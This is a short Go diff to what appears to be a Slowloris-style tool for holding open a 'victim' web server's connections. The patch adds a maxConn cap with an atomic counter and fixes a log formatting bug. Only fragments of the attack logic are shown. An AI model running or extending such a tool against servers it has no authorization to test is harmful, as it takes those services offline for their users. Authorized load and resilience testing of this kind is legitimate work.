@@ -14,6 +14,7 @@ import (
 	"net/url"
 	"runtime"
 	"strings"
+	"sync/atomic"
 	"time"
 )
 
@@ -26,6 +27,7 @@ var (
 	testDuration     = flag.Duration("testDuration", time.Hour, "Test duration")
 	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url. Http POST must be allowed in nginx config for this url")
 	hostHeader       = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
+	maxConn          = flag.Int("maxConn", 1024, "maximum number of connection")
 )
 
 var (
@@ -47,7 +49,7 @@ func main() {
 
 	victimUri, err := url.Parse(*victimUrl)
 	if err != nil {
-		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", victimUrl, err)
+		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", *victimUrl, err)
 	}
 	victimHostPort := victimUri.Host
 	if !strings.Contains(victimHostPort, ":") {
@@ -78,6 +80,10 @@ func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri
 	isTls := (victimUri.Scheme == "https")
 	for {
 		time.Sleep(*rampUpInterval)
+		if atomic.LoadInt32(&connectionsCountAsync) > int32(*maxConn) {
+			continue
+		}
+
 		conn := dialVictim(victimHostPort, isTls)
 		if conn != nil {
 			go doLoris(conn, victimUri, activeConnectionsCh, requestHeader)
@@ -85,10 +91,11 @@ func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri
 	}
 }
 
+var connectionsCountAsync int32
+
 func activeConnectionsCounter(ch <-chan int) {
-	var connectionsCount int
 	for n := range ch {
-		connectionsCount += n
+		connectionsCount := atomic.AddInt32(&connectionsCountAsync, int32(n))
 		log.Printf("Holding %d connections\n", connectionsCount)
 	}
 }
